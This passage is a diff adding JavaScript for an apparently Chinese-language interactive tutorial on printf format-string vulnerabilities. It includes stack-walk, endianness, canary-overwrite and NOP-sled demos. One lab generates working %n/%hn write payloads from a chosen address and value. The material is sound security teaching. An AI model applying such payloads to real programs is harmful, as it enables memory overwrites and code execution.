+      state.note = '扫描结束，共输出 ' + state.count + ' 个字符。' +
+        (state.cursor > state.args.length + 1 ? ' 注意：ap 已经越过实际参数区，后面取到的全是栈上残留数据。' : '');
+    } else {
+      state.current = state.index;
+    }
+    if (!didConv && state.index >= state.tokens.length && !state.crashed) state.done = true;
+    render();
+  }
+
+  function renderStack() {
+    let html = '<div class="stack-cap"><span>PARAM AREA · HIGH → LOW</span><span>ap = #' +
+      (state.done || state.crashed ? '—' : state.cursor) + '</span></div>';
+    html += '<div class="stack-row ctx"><span class="ap"></span><span class="addr">0xbfffec0c</span><span class="val">↑ 更高地址</span><span class="lbl">调用者的栈帧</span></div>';
+
+    for (let k = SLOT_COUNT; k >= 1; k--) {
+      const slot = state.slots[k - 1];
+      const st = state.status[k];
+      let cls = 'stack-row';
+      if (st === 'leaked') cls += ' leaked';
+      else if (st === 'read') cls += ' read';
+      else if (st === 'wrote') cls += ' wrote';
+      else if (st === 'crash') cls += ' crash';
+      if (k === state.cursor && !state.done && !state.crashed) cls += ' hot';
+      const ap = (k === state.cursor && !state.done && !state.crashed) ? 'ap →' : '';
+      html += '<div class="' + cls + '">' +
+        '<span class="ap">' + ap + '</span>' +
+        '<span class="addr">' + hex8(slot.addr) + '</span>' +
+        '<span class="val">' + hex8(slot.v) + '</span>' +
+        '<span class="lbl">#' + k + ' · ' + slot.label + '</span>' +
+      '</div>';
+    }
+
+    html += '<div class="stack-row ctx"><span class="ap"></span><span class="addr">' + hex8(FMT_ADDR) +
+      '</span><span class="val">0x08048568</span><span class="lbl">格式串 fmt（参数 #1 在它上面）</span></div>';
+    html += '<div class="stack-row ctx"><span class="ap"></span><span class="addr">' + hex8(RET_ADDR) +
+      '</span><span class="val">0x080484a1</span><span class="lbl">返回地址 RET</span></div>';
+    html += '<div class="stack-row ctx"><span class="ap"></span><span class="addr">更低地址</span><span class="val">… printf 自己的栈帧 …</span><span class="lbl">esp / 局部变量</span></div>';
+    els.stack.innerHTML = html;
+  }
+
+  function renderScan() {
+    const toks = state.tokens;
+    let html = '';
+    toks.forEach((tok, i) => {
+      const safe = esc(tok.text);
+      if (state.done) html += '<span class="done">' + safe + '</span>';
+      else if (i === state.current) html += '<span class="cur">' + safe + '</span>';
+      else if (i < state.current) html += '<span class="done">' + safe + '</span>';
+      else html += safe;
+    });
+    if (!toks.length) html = '<span class="done">（空格式串）</span>';
+    els.scan.innerHTML = html;
+
+    if (state.crashed) els.token.textContent = 'HALT · SIGSEGV';
+    else if (state.done) els.token.textContent = 'EOF · 扫描结束';
+    else {
+      const tok = toks[state.current];
+      if (!tok) els.token.textContent = '—';
+      else if (tok.type === 'lit') els.token.textContent = '普通文本 · ' + tok.text.length + ' 字符';
+      else if (tok.conv === '%') els.token.textContent = '%% · 字面百分号';
+      else els.token.textContent = tok.text + ' · 参数 #' + (tok.pos || state.cursor);
+    }
+  }
+
+  function renderMeta() {
+    els.ap.textContent = (state.done || state.crashed) ? '—' : '#' + state.cursor;
+    els.count.textContent = String(state.count);
+    els.note.textContent = state.note;
+  }
+
+  function renderOut() {
+    if (!state.out.length) {
+      els.out.textContent = 'printf 的输出会出现在这里。';
+    } else {
+      els.out.innerHTML = state.out.map(c => '<span class="' + c.cls + '">' + esc(c.text) + '</span>').join('');
+      els.out.scrollTop = els.out.scrollHeight;
+    }
+  }
+
+  function renderButtons() {
+    const dead = !state || state.done || state.crashed || !state.tokens.length;
+    els.step.disabled = dead;
+    els.step.textContent = state && state.done ? '已完成 ✓' : '单步 ▶';
+    els.auto.disabled = dead;
+    if (!autoRunning) els.auto.textContent = '自动播放';
+  }
+
+  function render() {
+    renderStack();
+    renderScan();
+    renderMeta();
+    renderOut();
+    renderButtons();
+  }
+
+  function stopAuto() {
+    if (autoTimer) { clearInterval(autoTimer); autoTimer = 0; }
+    autoRunning = false;
+    if (els.auto) els.auto.textContent = '自动播放';
+  }
+
+  function startAuto() {
+    if (!state || state.done || state.crashed) return;
+    autoRunning = true;
+    els.auto.textContent = '暂停 ⏸';
+    autoTimer = setInterval(() => {
+      if (!state || state.done || state.crashed) { stopAuto(); renderButtons(); return; }
+      executeOne();
+      if (state.done || state.crashed) { stopAuto(); renderButtons(); }
+    }, 720);
+  }
+
+  function resetSim() {
+    stopAuto();
+    const fmt = els.fmt ? els.fmt.value : '';
+    const args = els.args ? parseArgs(els.args.value) : [];
+    state = {
+      tokens: parseFormat(fmt),
+      args,
+      slots: buildSlots(args),
+      cursor: 1,
+      count: 0,
+      index: 0,
+      current: 0,
+      activeSlot: 0,
+      status: {},
+      out: [],
+      note: '',
+      crashed: false,
+      crashSlot: 0,
+      crashAt: null,
+      done: false
+    };
+    state.note = state.tokens.length
+      ? '点“单步”，观察每次转换说明符如何移动 ap。前三格之后的“残留数据”都不是你传入的参数。'
+      : '格式串为空——printf 什么也不会输出。';
+    if (!state.tokens.length) state.done = true;
+    render();
+  }
+
+  if (els.step) els.step.addEventListener('click', () => { stopAuto(); executeOne(); });
+  if (els.auto) els.auto.addEventListener('click', () => { if (autoRunning) { stopAuto(); renderButtons(); } else startAuto(); });
+  if (els.reset) els.reset.addEventListener('click', resetSim);
+
+  const resetDebounced = debounce(resetSim, 260);
+  if (els.fmt) els.fmt.addEventListener('input', resetDebounced);
+  if (els.args) els.args.addEventListener('input', resetDebounced);
+
+  $$('.preset', root).forEach(btn => {
+    btn.addEventListener('click', () => {
+      if (els.fmt) els.fmt.value = btn.dataset.fmt || '';
+      if (els.args) els.args.value = btn.dataset.args || '';
+      resetSim();
+    });
+  });
+
+  resetSim();
+})();
+/* ============================================================
+   LAB 00 — format inspector
+   ============================================================ */
+(() => {
+  const input = $('#fmtInspect');
+  if (!input) return;
+  const chipsEl = $('#inspectTokens');
+  const riskEl = $('#inspectRisk');
+  const riskText = $('#inspectRiskText');
+  const verdict = $('#inspectVerdict');
+
+  const SPEC_RE = /%(?:(\d+)\$)?([-+ #0]*)(\d+)?(?:\.(\d+))?(hh|h|ll|l|j|z|t|L)?([diouxXeEfFgGaAcspn%])/g;
+
+  function scan(fmt) {
+    const out = [];
+    let last = 0, m;
+    SPEC_RE.lastIndex = 0;
+    while ((m = SPEC_RE.exec(fmt))) {
+      if (m.index > last) out.push({ type: 'lit', text: fmt.slice(last, m.index) });
+      out.push({
+        type: 'conv', conv: m[6], pos: m[1] ? parseInt(m[1], 10) : 0,
+        width: m[3] ? parseInt(m[3], 10) : 0, text: m[0]
+      });
+      last = SPEC_RE.lastIndex;
+      if (m[0] === '') SPEC_RE.lastIndex++;
+    }
+    if (last < fmt.length) out.push({ type: 'lit', text: fmt.slice(last) });
+    return out;
+  }
+
+  const LABEL = { s: '任意读', n: '任意写', x: '泄露', X: '泄露', p: '泄露', d: '泄露', i: '泄露', u: '泄露', o: '泄露', c: '泄露', '%': '字面量' };
+
+  function render() {
+    const fmt = input.value;
+    const toks = scan(fmt);
+    let chipCount = 0, total = 0;
+    const chips = [];
+    let write = 0, read = 0, leak = 0, literal = 0;
+
+    toks.forEach(tok => {
+      if (tok.type === 'lit') {
+        if (!tok.text) return;
+        literal++;
+        const shown = tok.text.length > 24 ? tok.text.slice(0, 24) + '…' : tok.text;
+        chips.push('<span class="tok safe" title="普通文本，不会被 printf 当作指令">"' + esc(shown) + '"</span>');
+      } else if (tok.conv === '%') {
+        chips.push('<span class="tok safe" title="%% 会输出一个普通百分号，不取参数">%% → %</span>');
+      } else {
+        const cls = tok.conv === 'n' ? 'write' : tok.conv === 's' ? 'read' : 'leak';
+        const label = LABEL[tok.conv] || '转换';
+        if (tok.conv === 'n') write++;
+        else if (tok.conv === 's') read++;
+        else leak++;
+        chips.push('<span class="tok ' + cls + '">' + esc(tok.text) + ' · ' + label + '</span>');
+      }
+      total++;
+    });
+
+    const shownChips = chips.slice(0, 24);
+    chipsEl.innerHTML = shownChips.length
+      ? shownChips.join('') + (chips.length > 24 ? '<span class="tok-empty">+' + (chips.length - 24) + ' …</span>' : '')
+      : '<span class="tok-empty">没有可解析的格式指令</span>';
+
+    let level = 'safe', pct = 5, label = 'SAFE / DATA ONLY', color = 'var(--acid)';
+    let html = '';
+
+    if (write) {
+      level = 'write'; pct = 100; label = 'WRITE / CRITICAL'; color = 'var(--red)';
+      html = '<strong>任意地址写。</strong>检测到 ' + write + ' 个 <code>%n</code>。它不打印任何东西，而是把“已输出字符数”写入参数指向的地址。' +
+        '在这段输入直接进入 <code>printf(user)</code> 的前提下，攻击者就能控制写入的地址与数值。<span class="vd">风险不是“显示错乱”，而是内存被改写。</span>';
+    } else if (read) {
+      level = 'read'; pct = 68; label = 'READ / HIGH'; color = 'var(--amber)';
+      html = '<strong>任意读 / 崩溃。</strong>检测到 ' + read + ' 个 <code>%s</code>。printf 会把栈上的 4 字节当地址，去那个地址读字符串。' +
+        '地址合法就泄密，不合法就 SIGSEGV。<span class="vd">不需要额外参数，只要控制格式串就能触发。</span>';
+    } else if (leak) {
+      level = 'leak'; pct = 38; label = 'LEAK / MEDIUM'; color = 'var(--cyan)';
+      html = '<strong>栈数据泄露。</strong>检测到 ' + leak + ' 个取参数的说明符。它们会把栈上的值当成整数/指针打印出来，' +
+        '可能泄露返回地址、栈地址、canary 等布局信息。<span class="vd">看起来“只是乱码”，实际是后续利用的钥匙。</span>';
+    } else if (literal) {
+      html = '<strong>只有普通文本。</strong>没有 <code>%</code> 指令被执行，printf 只会原样复制这些字符（<code>%%</code> 会还原成一个 <code>%</code>）。' +
+        (fmt.indexOf('%%') >= 0
+          ? '<span class="vd">注意：<code>%%</code> 是转义，不是“取参数”。</span>'
+          : '<span class="vd">只要格式串里没有转换说明符，printf 就没有可执行的“程序”。</span>');
+    } else if (fmt.indexOf('%%') >= 0) {
+      html = '<strong>只有转义百分号。</strong>这一段会原样输出一个 <code>%</code>，printf 不会去栈上取任何参数。' +
+        '<span class="vd">注意：<code>%%</code> 是转义，不是“取参数”。</span>';
+    } else {
+      html = '<strong>格式串为空。</strong>不会输出任何内容，也不会取参数。' +
+        '<span class="vd">只要格式串里没有转换说明符，printf 就没有可执行的“程序”。</span>';
+    }
+
+    riskEl.style.width = pct + '%';
+    riskEl.style.background = color;
+    riskText.textContent = label;
+    verdict.innerHTML = html;
+  }
+
+  input.addEventListener('input', render);
+  render();
+})();
+
+/* ============================================================
+   LAB 03 — little endian
+   ============================================================ */
+(() => {
+  const input = $('#endianIn');
+  if (!input) return;
+  const bytesEl = $('#endianBytes');
+  const dwordEl = $('#endianDword');
+  const noteEl = $('#endianNote');
+
+  function charLabel(code) {
+    if (code === 0) return '∅';
+    if (code === 32) return '␠';
+    if (code >= 32 && code <= 126) return "'" + String.fromCharCode(code) + "'";
+    return '·';
+  }
+
+  function render() {
+    const raw = input.value.slice(0, 4);
+    const chars = Array.from(raw);
+    const bytes = chars.map(c => c.charCodeAt(0) & 0xff);
+    while (bytes.length < 4) bytes.push(0);
+
+    bytesEl.innerHTML = bytes.map((b, i) =>
+      '<span class="e-byte">0x' + hex2(b) + ' ' + esc(i < chars.length ? charLabel(b) : '∅') + '</span>'
+    ).join('');
+
+    const dword = ((bytes[0]) | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24)) >>> 0;
+    const bigEndian = ((bytes[0] << 24) | (bytes[1] << 16) | (bytes[2] << 8) | bytes[3]) >>> 0;
+    dwordEl.textContent = hex8(dword);
+
+    if (raw.length < 4) {
+      noteEl.textContent = '不足 4 字节，后面按 0x00 补齐。真实 payload 里通常用填充字符把地址对齐到 4 字节。';
+    } else {
+      noteEl.textContent = '内存从低到高是 ' + bytes.map(b => '0x' + hex2(b)).join(' ') +
+        '。x86 按小端读成 ' + hex8(dword) + '（十进制 ' + dword + '）；如果按大端读，则是 ' + hex8(bigEndian) + '。';
+    }
+  }
+
+  input.addEventListener('input', render);
+  render();
+})();
+
+/* ============================================================
+   LAB 04 — four-byte %n write / canary stomp
+   ============================================================ */
+(() => {
+  const strip = $('#canaryBytes');
+  if (!strip) return;
+  const fooEl = $('#canaryFoo');
+  const canEl = $('#canaryCan');
+  const stepEl = $('#canaryStep');
+  const noteEl = $('#canaryNote');
+  const nextBtn = $('#canaryNext');
+  const allBtn = $('#canaryAll');
+  const resetBtn = $('#canaryReset');
+
+  const initial = [0x00, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41, 0x00];
+  const steps = [
+    { n: 16, target: 0, note: '从 foo[0] 起写 4 字节 10 00 00 00。foo 变成 10 00 00 00，还没碰到 canary。' },
+    { n: 32, target: 1, note: '从 foo[1] 起写 20 00 00 00：后 3 个字节落在 foo[2..3]，最后一个零字节已经踩到 canary[0]。' },
+    { n: 64, target: 2, note: '从 foo[2] 起写 40 00 00 00：两个零字节踩掉 canary[0..1]。' },
+    { n: 128, target: 3, note: '从 foo[3] 起写 80 00 00 00：3 个零字节把 canary[0..2] 清零，只剩 canary[3]=41。' }
+  ];
+
+  let bytes = initial.slice();
+  let step = 0;
+  let lastRange = null;
+
+  function render() {
+    strip.innerHTML = bytes.map((b, i) => {
+      const canary = i >= 4;
+      const inRange = lastRange && i >= lastRange.start && i <= lastRange.end;
+      const stomped = canary && inRange;
+      const cls = ['byte', canary ? 'canary' : 'foo', inRange ? 'changed' : '', stomped ? 'stomped' : ''].join(' ').trim();
+      const idx = canary ? 'canary[' + (i - 4) + ']' : 'foo[' + i + ']';
+      return '<div class="' + cls + '"><span class="bi">' + idx + '</span><span class="bv">' + hex2(b) + '</span></div>';
+    }).join('');
+
+    fooEl.textContent = bytes.slice(0, 4).map(hex2).join(' ');
+    canEl.textContent = bytes.slice(4, 9).map(hex2).join(' ');
+
+    if (step === 0) {
+      stepEl.innerHTML = '<span class="dim">等待第 1 次写入…</span>';
+      noteEl.textContent = '每条 printf("%Nu%n", ..., &foo[k]) 都从 foo[k] 开始写 4 字节，而不是 1 字节。';
+    } else {
+      const s = steps[step - 1];
+      stepEl.innerHTML = '<b>第 ' + step + ' 条</b> %' + s.n + 'u%n → &amp;foo[' + s.target + '] <span class="dim">写 4 字节</span>';
+      noteEl.textContent = s.note;
+    }
+
+    if (nextBtn) {
+      nextBtn.disabled = step >= steps.length;
+      nextBtn.textContent = step >= steps.length ? '已完成 ✓' : '执行下一条 →';
+    }
+    if (allBtn) allBtn.disabled = step >= steps.length;
+    if (resetBtn) resetBtn.disabled = step === 0;
+  }
+
+  function applyStep() {
+    if (step >= steps.length) return;
+    const s = steps[step];
+    const written = leBytes(s.n);
+    for (let k = 0; k < 4; k++) {
+      const idx = s.target + k;
+      if (idx < bytes.length) bytes[idx] = written[k];
+    }
+    lastRange = { start: s.target, end: Math.min(bytes.length - 1, s.target + 3) };
+    step++;
+    render();
+  }
+
+  if (nextBtn) nextBtn.addEventListener('click', applyStep);
+  if (allBtn) allBtn.addEventListener('click', () => { while (step < steps.length) applyStep(); });
+  if (resetBtn) resetBtn.addEventListener('click', () => {
+    bytes = initial.slice();
+    step = 0;
+    lastRange = null;
+    render();
+  });
+  render();
+})();
+
+/* ============================================================
+   LAB 05 — payload builder (%n / %hn)
+   ============================================================ */
+(() => {
+  const addrIn = $('#payAddr');
+  if (!addrIn) return;
+  const valIn = $('#payVal');
+  const mIn = $('#payM');
+  const prefixIn = $('#payPrefix');
+  const modeWrap = $('#payMode');
+  const strEl = $('#payString');
+  const bytesEl = $('#payBytes');
+  const nEl = $('#payN');
+  const totalEl = $('#payTotal');
+  const noteEl = $('#payNote');
+  const copyBtn = $('#payCopy');
+  const exampleBtn = $('#payExample');
+
+  let mode = 'n';
+
+  function readHex(s, fallback) {
+    s = String(s || '').trim();
+    if (!s) return fallback;
+    if (/^0x[0-9a-f]+$/i.test(s)) return parseInt(s.slice(2), 16);
+    if (/^[0-9a-f]+$/i.test(s)) return parseInt(s, 16);
+    return fallback;
+  }
+  function readInt(s, fallback) {
+    const n = parseInt(String(s || '').trim(), 10);
+    return Number.isFinite(n) ? n : fallback;
+  }
+  const bytesText = n => leBytes(n).map(b => '\\x' + b.toString(16).padStart(2, '0')).join('');
+
+  function setMode(next) {
+    mode = next;
+    if (modeWrap) modeWrap.querySelectorAll('button').forEach(b => b.classList.toggle('on', b.dataset.mode === mode));
+    render();
+  }
+
+  function invalid(msg) {
+    strEl.textContent = '—';
+    nEl.textContent = '—';
+    totalEl.textContent = '—';
+    noteEl.textContent = msg;
+    noteEl.style.color = 'var(--amber)';
+  }
+
+  function render() {
+    const addr = readHex(addrIn.value, NaN);
+    const val = readHex(valIn.value, NaN);
+    const prefix = Math.max(0, Math.min(999, readInt(prefixIn.value, 0)));
+    const M = Math.max(1, Math.min(20, readInt(mIn.value, 5)));
+
+    if (!Number.isFinite(addr) || addr < 0 || addr > 0xffffffff) {
+      invalid('目标地址无效。请输入 32 位十六进制地址，例如 0xbfffec88。');
+      return;
+    }
+    if (!Number.isFinite(val) || val < 0 || val > 0xffffffff) {
+      invalid('写入值无效。请输入 32 位十六进制值，例如 0x41。');
+      return;
+    }
+
+    const a = addr >>> 0;
+
+    if (mode === 'n') {
+      bytesEl.textContent = bytesText(a).match(/\\x[0-9a-f]{2}/g).join(' ');
+      const base = prefix + 4;
+      const n = val - base;
+
+      if (n < 0) {
+        invalid('目标值 ' + hex8(val) + ' 小于“前缀 ' + prefix + ' + 地址 4”的开销，%n 无法写出比已输出计数更小的值。');
+        return;
+      }
+
+      const payload = bytesText(a) + (n > 0 ? '%' + n + 'c' : '') + '%' + M + '$n';
+      strEl.textContent = payload;
+      nEl.textContent = String(n);
+      totalEl.textContent = String(prefix + 4 + n);
+      let msg = hex8(val) + ' 的十进制是 ' + val + '；前缀 ' + prefix + ' + 地址 4 + 宽度 ' + n + ' = ' + (prefix + 4 + n) + '。%n 写入 32 位值。';
+      if (n > 1000000) msg += ' 需要输出 ' + (prefix + 4 + n) + ' 个字符，现实中不可行；真实利用会拆成 %hn / %hhn。';
+      noteEl.textContent = msg;
+      noteEl.style.color = n > 1000000 ? 'var(--amber)' : 'var(--ink3)';
+      return;
+    }
+
+    const lo = val & 0xffff;
+    const hi = (val >>> 16) & 0xffff;
+    const base = prefix + 8;
+    const lowFirst = lo <= hi;
+    const t1 = lowFirst ? lo : hi;
+    const t2 = lowFirst ? hi : lo;
+    const addr1 = lowFirst ? a : ((a + 2) >>> 0);
+    const addr2 = lowFirst ? ((a + 2) >>> 0) : a;
+    const n1 = t1 - base;
+    const n2 = t2 - t1;
+
+    bytesEl.textContent = (bytesText(addr1) + bytesText(addr2)).match(/\\x[0-9a-f]{2}/g).join(' ');
+
+    if (n1 < 0) {
+      invalid('两次 %hn 不可行：先写的那一半是 ' + hex8(t1) + '（0x' + t1.toString(16) + '），' +
+        '而两段地址已经占 ' + base + ' 个字符。输出计数只增不减，无法回退到这么小的值。改用 %n 或 %hhn。');
+      return;
+    }
+
+    const part1 = (n1 > 0 ? '%' + n1 + 'c' : '') + '%' + M + '$hn';
+    const part2 = (n2 > 0 ? '%' + n2 + 'c' : '') + '%' + (M + 1) + '$hn';
+    const payload = bytesText(addr1) + bytesText(addr2) + part1 + part2;
+
+    strEl.textContent = payload;
+    nEl.textContent = n1 + ' / ' + n2;
+    totalEl.textContent = String(base + n1 + n2);
+    noteEl.textContent = '低半字 0x' + lo.toString(16).padStart(4, '0') + '，高半字 0x' + hi.toString(16).padStart(4, '0') +
+      '。先写较小的 0x' + t1.toString(16).padStart(4, '0') + '（n1=' + n1 + '），再写较大的 0x' +
+      t2.toString(16).padStart(4, '0') + '（n2=' + n2 + '，用差值补上）。' +
+      '地址顺序：' + hex8(addr1) + ' → ' + hex8(addr2) + '；最终输出计数是 ' + (base + n1 + n2) + '，不是完整 32 位值。';
+    noteEl.style.color = 'var(--ink3)';
+  }
+
+  if (modeWrap) modeWrap.addEventListener('click', e => {
+    const btn = e.target.closest('button[data-mode]');
+    if (btn) setMode(btn.dataset.mode);
+  });
+  [addrIn, valIn, mIn, prefixIn].forEach(el => el.addEventListener('input', render));
+  if (copyBtn) copyBtn.addEventListener('click', () => {
+    const p = strEl.textContent;
+    if (!p || p === '—') { toast('当前没有可复制的 payload'); return; }
+    copyText(p, 'payload 已复制');
+  });
+  if (exampleBtn) exampleBtn.addEventListener('click', () => {
+    valIn.value = '0x41414141';
+    setMode('hn');
+    toast('已填入 0x41414141，并切换到 %hn 演示拆分');
+  });
+
+  render();
+})();
+
+/* ============================================================
+   LAB 06 — NOP sled
+   ============================================================ */
+(() => {
+  const cells = $('#sledCells');
+  if (!cells) return;
+  const textEl = $('#sledText');
+  const throwBtn = $('#sledBtn');
+  const resetBtn = $('#sledReset');
+
+  const BASE = 0xbfffec00;
+  const COUNT = 24;
+  const BEFORE = 6;
+  const NOP_END = 19;
+  let timers = [];
+
+  function build() {
+    let html = '';
+    for (let i = 0; i < COUNT; i++) {
+      if (i < BEFORE) html += '<i title="雪橇之前的随机数据">··</i>';
+      else if (i < NOP_END) html += '<i title="NOP 0x90">90</i>';
+      else html += '<i class="sc" title="shellcode">SC</i>';
+    }
+    cells.innerHTML = html;
+  }
+
+  function clearMarks() {
+    timers.forEach(t => clearTimeout(t));
+    timers = [];
+    Array.from(cells.children).forEach(c => c.classList.remove('land', 'sweep', 'exec'));
+  }
+
+  function reset() {
+    clearMarks();
+    if (textEl) textEl.textContent = '点击按钮，随机投掷一个返回地址。绿色格子是 NOP，红色格子是 shellcode。';
+  }
+
+  function throwAddress() {
+    clearMarks();
+    const idx = Math.floor(Math.random() * COUNT);
+    const addr = (BASE + idx * 4) >>> 0;
+    const cell = cells.children[idx];
+    cell.classList.add('land');
+
+    if (idx < BEFORE) {
+      textEl.innerHTML = '落点 <b>' + hex8(addr) + '</b> 在雪橇之前 → 把随机数据当指令执行 → <span class="bad">SIGSEGV</span>。地址猜得太偏，救不回来。';
+      return;
+    }
+
+    if (idx >= NOP_END) {
+      cell.classList.remove('land');
+      cell.classList.add('exec');
+      textEl.innerHTML = '落点 <b>' + hex8(addr) + '</b> 直接命中 shellcode → 执行 <b>execve("/bin/sh")</b>。一次命中，不需要滑行。';
+      return;
+    }
+
+    const steps = NOP_END - idx;
+    textEl.innerHTML = '落点 <b>' + hex8(addr) + '</b> 是 NOP → 开始滑行…';
+    for (let i = idx; i < NOP_END; i++) {
+      timers.push(setTimeout(() => {
+        cells.children[i].classList.add('sweep');
+        if (i === NOP_END - 1) {
+          for (let j = NOP_END; j < COUNT; j++) cells.children[j].classList.add('exec');
+          textEl.innerHTML = '从 <b>' + hex8(addr) + '</b> 滑行 ' + steps + ' 格 → 进入 shellcode → <b>execve("/bin/sh")</b>。返回地址不需要精确落在 shellcode 的第一个字节。';
+        }
+      }, 65 * (i - idx)));
+    }
+  }
+
+  if (throwBtn) throwBtn.addEventListener('click', throwAddress);
+  if (resetBtn) resetBtn.addEventListener('click', reset);
+  build();
+  reset();
+})();
+/* ============================================================
+   QUIZ — accordions + progress count
+   ============================================================ */
+(() => {
+  const allQa = $$('.qa');
+  const selfQuiz = $('#selfQuiz');
+  const countEl = $('#quizCount');
+
+  function sync(qa) {
+    const open = qa.classList.contains('open');
+    const btn = qa.querySelector('.qa-q');
+    if (btn) btn.setAttribute('aria-expanded', open ? 'true' : 'false');
+  }
+
+  function setOpen(qa, open) {
+    qa.classList.toggle('open', open);
+    sync(qa);
+  }
+
+  function updateCount() {
+    if (!countEl || !selfQuiz) return;
+    const items = $$('.qa', selfQuiz);
+    const open = items.filter(qa => qa.classList.contains('open')).length;
+    countEl.textContent = open + ' / ' + items.length + ' 已展开';
+  }
+
+  allQa.forEach(qa => {
+    const btn = qa.querySelector('.qa-q');
+    if (!btn) return;
+    sync(qa);
+    btn.addEventListener('click', () => {
+      setOpen(qa, !qa.classList.contains('open'));
+      updateCount();
+    });
+  });
+
+  const openBtn = $('#quizAllOpen');
+  const closeBtn = $('#quizAllClose');
+  if (openBtn) openBtn.addEventListener('click', () => {
+    if (!selfQuiz) return;
+    $$('.qa', selfQuiz).forEach(qa => setOpen(qa, true));
+    updateCount();
+  });
+  if (closeBtn) closeBtn.addEventListener('click', () => {
+    if (!selfQuiz) return;
+    $$('.qa', selfQuiz).forEach(qa => setOpen(qa, false));
+    updateCount();
+  });
+  updateCount();
+
+  /* Final safety: reveal everything if observers never fired. */
+  setTimeout(() => {
+    $$('.reveal:not(.in)').forEach(el => el.classList.add('in'));
+    updateScroll();
+  }, 3000);
+})();
+
+})();
+</script>
+</body>
+</html>
